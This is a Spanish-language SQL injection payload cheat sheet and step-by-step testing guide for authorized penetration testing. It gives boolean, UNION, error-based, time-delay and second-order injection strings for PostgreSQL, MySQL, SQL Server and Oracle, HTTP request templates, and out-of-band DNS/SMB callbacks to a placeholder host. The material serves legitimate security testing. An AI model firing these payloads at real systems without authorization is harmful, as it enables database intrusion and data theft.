# 🗡️ SQL injection: payloads y técnicas

> **Uso autorizado:** sustituir `{ORIGEN}`, `{TOKEN_A}`, `{ID_PROPIO}` y `{ID_CONTROLADO_B}` por valores del entorno y de cuentas propias. No ejecutar muestras que cambien estado sin permiso específico y plan de reversión.

## 🎯 Preparación

- Capturar primero la solicitud legítima y su respuesta esperada.
- Mantener igual método, sesión, cabeceras y cuerpo salvo el campo bajo prueba.
- Usar un marcador único como `prueba-123` para distinguir reflejos y efectos de caché.

> **Lectura del banco:** cuando un bloque enumera varias URL, rutas, cabeceras o cuerpos, cada línea suele ser una alternativa. Elegir la variante que corresponde al motor, parser y flujo real.

## 💉 Payloads básicos

### Sondas de tipo y comillas

```text
'
''
"
1 AND 1=1
1 AND 1=2
' AND '1'='1'-- -
' AND '1'='2'-- -
```

**Cuándo usarlo:** Enviar una línea por solicitud. Comparar el mismo registro propio y controlar validación/caché; en MySQL -- exige un espacio posterior, aquí seguido de -.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).


### Cierre y comentarios según motor

```text
'-- -
'#
'/*
1-- -
1#
```

**Cuándo usarlo:** Probar solo después de identificar el contexto. # es comentario de MySQL; /* sin cierre sirve únicamente si el resto de la consulta lo cierra.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).


## 🧭 Payloads por contexto

### ORDER BY y UNION de dos columnas

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,'prueba-123'-- -
```

**Cuándo usarlo:** Cada línea es alternativa independiente para una SELECT visible. Ajustar número y tipos de columnas; confirmar que el marcador no es simple reflejo.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).


### Predicados booleanos en texto y número

```sql
' AND '1'='1'-- -
' AND '1'='2'-- -
1 AND 1=1
1 AND 1=2
' AND SUBSTRING('prueba-123',1,1)='p'-- -
```

**Cuándo usarlo:** Usar el par verdadero/falso con idéntico resto de request. SUBSTRING es de ejemplo y puede requerir adaptar función y sintaxis al motor.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/sql-injection/blind).


### Funciones de versión sin consultar tablas de negocio

```sql
SELECT version()
SELECT @@version
SELECT sqlite_version()
SELECT banner FROM v$version
```

**Cuándo usarlo:** Consultas de referencia para PostgreSQL, MySQL/SQL Server, SQLite y Oracle, respectivamente; requieren punto de inyección compatible con SELECT.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).


## 🔥 Payloads avanzados

### Error condicionado o conversión de canary

```sql
SELECT CAST('prueba-123' AS INTEGER)
SELECT CONVERT(int,'prueba-123')
SELECT EXTRACTVALUE(1,CONCAT(0x5c,'prueba-123'))
```

**Cuándo usarlo:** Por separado: PostgreSQL, SQL Server y MySQL antiguo. Inducen error con literal propio; EXTRACTVALUE puede faltar en versiones actuales.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).


### Retardos breves por motor

```sql
' AND (SELECT 1 FROM pg_sleep(1))=1-- -
' AND IF(1=1,SLEEP(1),0)-- -
'; WAITFOR DELAY '00:00:01'-- -
```

**Cuándo usarlo:** Por separado: PostgreSQL, MySQL y SQL Server. Solo con autorización de pruebas temporales; comparar varias muestras con control sin retardo.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).


### OAST DNS sin datos de tablas

```sql
SELECT UTL_INADDR.get_host_address('prueba-123.{CONTROLLED_HOST}') FROM dual
EXEC master..xp_dirtree '\\prueba-123.{CONTROLLED_HOST}\a'
```

**Cuándo usarlo:** Oracle requiere privilegios/ACL. SQL Server puede iniciar SMB y exponer autenticación: usar solo laboratorio aislado y no recoger credenciales.

**Fuente:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).


## 🔬 Pruebas guiadas por escenario

### 1. Booleano de cadena: verdadero/falso

**Objetivo:** Usar un filtro de un registro propio cuyo valor cae entre comillas; comparar ambas requests.

```http
GET /api/items?name=prueba%27%20AND%20%271%27%3D%271%27--%20 HTTP/1.1
Host: {ORIGEN}

GET /api/items?name=prueba%27%20AND%20%271%27%3D%272%27--%20 HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** Debe cambiar el predicado, no solo el estado HTTP; repetir con un filtro literal y controlar caché.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 2. Booleano numérico

**Objetivo:** Solo si el parámetro se inserta como número sin comillas.

```http
GET /api/items?id=1%20AND%201%3D1 HTTP/1.1
Host: {ORIGEN}

GET /api/items?id=1%20AND%201%3D2 HTTP/1.1
Host: {ORIGEN}
```

**Interpretación:** La diferencia debe reproducirse sobre el mismo objeto; un 400 puede ser validación de tipo normal.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 3. Número de columnas con ORDER BY

**Objetivo:** En una consulta SELECT con salida visible, probar únicamente índices bajos y autorizados.

```text
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

**Interpretación:** El primer índice que causa error puede acotar columnas; exige contexto compatible y un control sin inyección.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 4. UNION con marcador propio

**Objetivo:** Después de conocer el número de columnas y tipos; ejemplo para dos columnas texto.

```sql
' UNION SELECT NULL,'prueba-123'--
```

**Interpretación:** Confirmar que el marcador procede de la fila UNION y no de un reflejo de la entrada.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 5. Retardo PostgreSQL

**Objetivo:** Medir un segundo en laboratorio o ventana autorizada; se necesita PostgreSQL y contexto booleano.

```sql
' AND (SELECT 1 FROM pg_sleep(1))=1--
```

**Interpretación:** Medir varias veces frente al mismo predicado sin pg_sleep; latencia de red no es confirmación.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 6. Retardo MySQL

**Objetivo:** Usar una pausa corta con un motor MySQL compatible.

```sql
' AND IF(1=1,SLEEP(1),0)--
```

**Interpretación:** Comparar con IF(1=2,SLEEP(1),0); no emplear pausas largas ni automatización intensiva.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 7. Retardo Microsoft SQL Server

**Objetivo:** Solo en un entorno aislado con consultas apiladas permitidas.

```sql
'; WAITFOR DELAY '00:00:01'--
```

**Interpretación:** El driver puede bloquear sentencias apiladas; fallo de esta variante no descarta SQLi.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 8. OAST DNS Microsoft SQL Server

**Objetivo:** Laboratorio o permiso expreso; subdominio único sin datos en la consulta.

```sql
'; EXEC master..xp_dirtree '\\prueba-123.{CONTROLLED_HOST}\a'--
```

**Interpretación:** Correlacionar solo DNS; esta función puede estar deshabilitada y una conexión SMB puede exponer autenticación, por lo que requiere aislamiento.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 9. OAST DNS Oracle

**Objetivo:** Laboratorio Oracle con UTL_INADDR permitido; no concatenar datos de tablas.

```sql
SELECT UTL_INADDR.get_host_address('prueba-123.{CONTROLLED_HOST}') FROM dual
```

**Interpretación:** Una ACL de red o falta de privilegios puede impedir callback aunque exista SQLi.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 10. UNION con NULL para tipos/columnas

**Objetivo:** Después de confirmar contexto SELECT, probar cantidad de columnas sin leer tablas.

```sql
' UNION SELECT NULL,NULL--
```

**Interpretación:** La aceptación puede indicar dos columnas compatibles; repetir con una y tres como controles.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 11. Error visible de conversión PostgreSQL

**Objetivo:** Solo si la aplicación expone errores del motor y la expresión entra en WHERE.

```sql
' AND 1=CAST('prueba-123' AS INTEGER)--
```

**Interpretación:** Un error de conversión con el marcador atribuido a PostgreSQL da señal de evaluación; un 500 genérico no.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 12. Error visible de conversión SQL Server

**Objetivo:** Motor T-SQL; condición que fuerza CONVERT en una consulta de prueba.

```sql
' AND 1=CONVERT(int,'prueba-123')--
```

**Interpretación:** El mensaje de conversión puede contener el marcador; no funciona si la consulta captura errores o no usa SQL Server.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 13. UNION en Oracle con FROM dual

**Objetivo:** Tras confirmar dos columnas y una posición de texto en Oracle, usar un marcador propio.

```sql
' UNION SELECT 'prueba-123',NULL FROM dual--
```

**Interpretación:** Oracle exige FROM en SELECT; el marcador debe proceder de la fila UNION, no del reflejo del parámetro.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/sql-injection/union-attacks).

### 14. Retardo condicional Oracle

**Objetivo:** Solo laboratorio Oracle con DBMS_PIPE accesible; comparar condición verdadera y falsa con un segundo.

```sql
SELECT CASE WHEN 1=1 THEN 'a'||DBMS_PIPE.RECEIVE_MESSAGE('prueba-123',1) ELSE NULL END FROM dual
```

**Interpretación:** Una diferencia repetible de latencia puede confirmar evaluación; privilegios y colas existentes afectan el resultado.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 15. Retardo condicional SQL Server

**Objetivo:** Se requiere ejecución de sentencias apiladas; probar un segundo y un control falso.

```sql
'; IF (1=1) WAITFOR DELAY '00:00:01'--
```

**Interpretación:** El control IF (1=2) debe ser más rápido; colas o latencia variable requieren varias mediciones.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 16. Error XML de MariaDB/MySQL antiguo

**Objetivo:** Solo en MariaDB o MySQL con EXTRACTVALUE disponible; usar exclusivamente marcador local.

```sql
' AND EXTRACTVALUE(1,CONCAT(0x5c,'prueba-123'))--
```

**Interpretación:** El error XPath puede incluir el marcador. MySQL 8 retiró EXTRACTVALUE: fallo de esta técnica no descarta SQLi.

**Fuente técnica:** [PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### 17. Inyección en estructura ORDER BY

**Objetivo:** Si `sort` se concatena como expresión SQL, probar dos filas propias con ID distintos.

```text
CASE WHEN 1=1 THEN id ELSE -id END
CASE WHEN 1=2 THEN id ELSE -id END
```

**Interpretación:** Debe invertirse el orden de las mismas filas; un parámetro `sort` con valores permitidos no es por sí solo SQLi.

**Fuente técnica:** [PortSwigger](https://portswigger.net/support/sql-injection-in-the-query-structure).

### 18. SQLi de segundo orden en registro propio

**Objetivo:** En laboratorio con una fila propia `name=prueba`, guardar uno de los valores en un campo que otro flujo reutiliza en `WHERE name='ENTRADA'`.

```text
prueba' AND '1'='1
prueba' AND '1'='2
```

**Interpretación:** Comparar el flujo posterior, no solo el guardado. Atribuir la diferencia a la consulta que reutiliza el dato persistido.

**Fuente técnica:** [PortSwigger](https://portswigger.net/kb/issues/00100210_sql-injection-second-order).

## ✅ Evidencia mínima

1. Solicitud de control y solicitud modificada, con diferencias visibles.
2. Respuesta o efecto observado en una cuenta/objeto de prueba independiente.
3. Explicación del control que falló y del alcance real comprobado.

---

[📖 Descripción y análisis](../Descripcion/README.md) · [← Índice general](../../README.md)
